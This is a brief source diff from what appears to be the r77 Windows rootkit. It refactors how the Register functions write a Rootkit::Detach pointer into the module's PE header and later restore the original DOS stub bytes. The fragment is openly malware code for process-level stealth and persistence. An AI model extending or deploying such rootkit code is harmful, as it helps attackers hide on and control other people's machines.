@@ -21,8 +21,7 @@ bool Register::Initialize()
 			// Write a function pointer to Rootkit::Detach that can be invoked using NtCreateThreadEx to detach r77 from this process.
 			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)Rootkit::Detach;
 
-			DWORD oldProtect2;
-			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect2);
+			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
 		}
 	}
 
@@ -41,8 +40,7 @@ void Register::Shutdown()
 			*(LPWORD)&module[sizeof(IMAGE_DOS_HEADER)] = 0x1f0e;
 			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = 0xb821cd09b4000eba;
 
-			DWORD oldProtect2;
-			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect2);
+			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
 		}
 	}
 }
